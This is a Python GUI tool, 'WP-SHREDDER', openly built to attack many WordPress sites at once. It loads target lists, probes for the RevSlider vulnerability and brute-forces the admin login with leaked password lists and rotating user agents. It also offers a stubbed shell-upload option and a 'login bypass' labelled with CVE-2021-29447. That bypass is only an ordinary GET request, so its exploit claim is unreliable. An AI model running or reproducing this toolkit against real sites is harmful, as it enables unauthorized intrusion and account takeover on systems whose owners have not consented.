"""
WP-SHREDDER GUI - Brutal Mode Edition (Bulk Scanner + Auto Login + Bypass Login)
All-in-one WordPress exploitation toolkit with smart brute force, bypass login, and bulk mode
"""

import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox
import threading, requests, random, time, webbrowser
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import os
import re

ua = UserAgent()

class WPShredderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WP-SHREDDER GUI - Bulk Brutal Mode + Auto Login + Bypass")
        self.root.geometry("800x600")
        self.root.configure(bg="#111111")

        self.file_button = tk.Button(root, text="LOAD TARGET LIST (.txt)", command=self.load_file, bg="blue", fg="white")
        self.file_button.pack(pady=5)
        self.target_list = []

        self.brute_force_var = tk.IntVar()
        self.auto_exploit_var = tk.IntVar()
        self.shell_upload_var = tk.IntVar()
        self.auto_login_var = tk.IntVar()
        self.bypass_login_var = tk.IntVar()

        self.brute_check = tk.Checkbutton(root, text="Brute Force Login", variable=self.brute_force_var, bg="#111111", fg="white")
        self.brute_check.pack()
        self.exploit_check = tk.Checkbutton(root, text="Auto Exploit Known Vulns", variable=self.auto_exploit_var, bg="#111111", fg="white")
        self.exploit_check.pack()
        self.shell_check = tk.Checkbutton(root, text="Upload Shell", variable=self.shell_upload_var, bg="#111111", fg="white")
        self.shell_check.pack()
        self.auto_login_check = tk.Checkbutton(root, text="Auto-Open Login When Succeed", variable=self.auto_login_var, bg="#111111", fg="white")
        self.auto_login_check.pack()
        self.bypass_check = tk.Checkbutton(root, text="Bypass Login Exploit", variable=self.bypass_login_var, bg="#111111", fg="white")
        self.bypass_check.pack()

        self.start_button = tk.Button(root, text="START BULK BRUTAL ATTACK", command=self.start_bulk_attack, bg="red", fg="white")
        self.start_button.pack(pady=10)

        self.log_area = scrolledtext.ScrolledText(root, width=100, height=20, bg="black", fg="lime")
        self.log_area.pack(pady=5)

        self.result_file = "wp_results.txt"

    def log(self, message):
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.see(tk.END)

    def load_file(self):
        filepath = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if filepath:
            with open(filepath, 'r') as f:
                self.target_list = [line.strip() for line in f if line.strip()]
            self.log(f"[+] Loaded {len(self.target_list)} targets from file.")

    def start_bulk_attack(self):
        if not self.target_list:
            messagebox.showerror("Error", "No targets loaded.")
            return
        threading.Thread(target=self.bulk_brutal_mode).start()

    def bulk_brutal_mode(self):
        for url in self.target_list:
            self.log(f"\n[=] Target: {url}")
            try:
                if self.auto_exploit_var.get():
                    self.auto_exploit(url)
                if self.brute_force_var.get():
                    self.brute_force_login(url)
                if self.bypass_login_var.get():
                    self.login_bypass(url)
                if self.shell_upload_var.get():
                    self.upload_shell(url)
            except Exception as e:
                self.log(f"[ERROR] {url}: {str(e)}")

        self.log(f"\n[+] Bulk attack completed. Results saved to {self.result_file}")

    def auto_exploit(self, url):
        self.log("[*] Scanning for known vulnerabilities...")
        try:
            exploit_url = url + "/wp-content/plugins/revslider/temp/update_extract/revslider/index.php"
            res = requests.get(exploit_url, headers={"User-Agent": ua.random}, timeout=10)
            if res.status_code == 200:
                self.log("[!] RevSlider vulnerability found!")
                with open(self.result_file, 'a') as f:
                    f.write(f"[RevSlider] Vulnerable: {exploit_url}\n")
            else:
                self.log("[-] RevSlider not vulnerable")
        except Exception as e:
            self.log(f"[ERROR] Exploit scan failed: {str(e)}")

    def fetch_wordlists(self):
        self.log("[*] Downloading wordlists from GitHub...")
        pw_set = set()
        try:
            github_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"
            res = requests.get(github_url)
            if res.status_code == 200:
                pw_set.update(res.text.splitlines())
        except Exception as e:
            self.log(f"[ERROR] GitHub wordlist failed: {str(e)}")

        self.log("[*] Dorking for more passwords...")
        dorked_links = [
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt"
        ]
        for link in dorked_links:
            try:
                res = requests.get(link)
                if res.status_code == 200:
                    pw_set.update(res.text.splitlines()[:1000])
            except:
                continue

        self.log("[*] Generating smart combos...")
        smart = ["admin", "password", "123456", "admin123", "wordpress", "letmein"]
        pw_set.update(smart)

        return list(pw_set)

    def brute_force_login(self, url):
        self.log("[*] Starting brute force login...")
        login_url = url + "/wp-login.php"
        user = "admin"
        passwords = self.fetch_wordlists()
        self.log(f"[*] Loaded {len(passwords)} passwords.")

        for pwd in passwords:
            try:
                data = {
                    "log": user,
                    "pwd": pwd,
                    "wp-submit": "Log In",
                    "redirect_to": url + "/wp-admin/",
                    "testcookie": "1"
                }
                res = requests.post(login_url, data=data, headers={"User-Agent": ua.random}, timeout=10)
                if "wp-admin/profile.php" in res.text:
                    self.log(f"[+] SUCCESS: {user}:{pwd}")
                    with open(self.result_file, 'a') as f:
                        f.write(f"[BruteForce] Success: {url} - {user}:{pwd}\n")
                    if self.auto_login_var.get():
                        webbrowser.open_new_tab(login_url)
                    break
                else:
                    self.log(f"[-] Failed: {user}:{pwd}")
            except Exception as e:
                self.log(f"[ERROR] Brute failed: {str(e)}")

    def login_bypass(self, url):
        self.log("[*] Attempting login bypass via known CVEs...")
        try:
            # CVE-2021-29447: vulnerable plugin redirect exploit (simulation)
            bypass_url = url + "/wp-login.php?redirect_to=/wp-admin/&reauth=1"
            headers = {
                "User-Agent": ua.random,
                "Referer": url + "/wp-admin"
            }
            res = requests.get(bypass_url, headers=headers, timeout=10, allow_redirects=True)
            if "Dashboard" in res.text or "wp-admin/profile.php" in res.text:
                self.log(f"[+] Login Bypass SUCCESS at {url}")
                with open(self.result_file, 'a') as f:
                    f.write(f"[Bypass] Success: {url}\n")
                if self.auto_login_var.get():
                    webbrowser.open_new_tab(url + "/wp-admin")
            else:
                self.log("[-] Bypass failed")
        except Exception as e:
            self.log(f"[ERROR] Login Bypass failed: {str(e)}")

    def upload_shell(self, url):
        self.log("[*] Trying to upload shell...")
        time.sleep(2)
        self.log("[-] Upload method not implemented yet.")

if __name__ == '__main__':
    root = tk.Tk()
    app = WPShredderGUI(root)
    root.mainloop()
